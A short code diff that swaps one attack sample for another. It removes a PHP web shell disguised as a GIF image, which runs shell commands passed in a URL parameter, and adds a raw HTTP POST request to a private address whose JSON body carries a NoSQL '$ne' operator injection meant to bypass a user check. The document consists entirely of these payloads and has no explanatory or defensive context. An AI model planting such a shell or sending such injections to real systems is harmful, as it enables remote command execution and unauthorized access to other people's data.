@@ -1,5 +1,6 @@
-GIF89a;
-<?php
-echo "Shell Active!<br>";
-system($_GET['cmd']);
-?>
+POST /api/messages HTTP/1.1
+Host: 10.81.186.177:5000
+Content-Type: application/json
+Content-Length: 28
+
+{"user": {"$ne": "demo"}}
